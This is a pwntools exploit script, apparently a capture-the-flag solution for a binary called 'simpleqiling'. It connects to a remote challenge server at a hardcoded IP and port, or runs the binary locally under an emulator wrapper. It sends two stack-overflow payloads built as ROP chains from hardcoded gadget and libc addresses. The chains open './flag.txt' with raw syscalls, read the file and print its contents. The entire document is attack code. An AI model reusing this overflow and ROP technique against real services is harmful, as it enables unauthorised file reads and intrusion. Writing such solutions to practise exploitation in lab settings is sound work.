#!/usr/bin/python3

from pwn import *

exe = ELF('simpleqiling_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('103.163.24.78', 10010)
else:
    p = process("python3 qi.py simpleqiling_patched".split())

# GDB()
libc.address = 0x00007FFFB7DFA083-0x24083
pop_rdi = 0x555555554000 + 0x0000000000001473
pop_rsi_r15 = 0x0000000000001471 + 0x555555554000
pop_rdx = libc.address + 0x0000000000142c92
pop_rax = libc.address + 0x0000000000036174
pltputs = 0x5555555550a0
pltread = 0x5555555550d0
main = 0x555555555314
syscall = libc.address + 0x00000000000630a9
pa = b'a'*8*5 + p64(0x6161616161616100)
pa += flat(0,
           # read
           pop_rdi+1,
           pop_rdi, 0,
           pop_rsi_r15, libc.sym.environ, 0,
           pop_rdx, 0x10,
           pltread,
            # open
           pop_rdi, libc.sym.environ,
           pop_rax, 0x2,
           pop_rsi_r15, 0, 0,
           pop_rdx, 0,
           syscall,
           main)
sa(b'say', pa)
print(len(pa))
sleep(1)
s(b'./flag.txt\0')
##########
pa = b'a'*8*5 + p64(0x6161616161616100)
pa += flat(0,
           pop_rdi+1,
           pop_rdi, 3,
           pop_rsi_r15, libc.sym.environ, 0,
           pop_rdx, 0x100,
           pltread,
           
           pop_rdi, 1,
           pop_rax, 0x1,
           pop_rsi_r15, libc.sym.environ, 0,
           pop_rdx, 0x100,
           syscall,
           
           main
           )
sa(b'say', pa)
p.interactive()
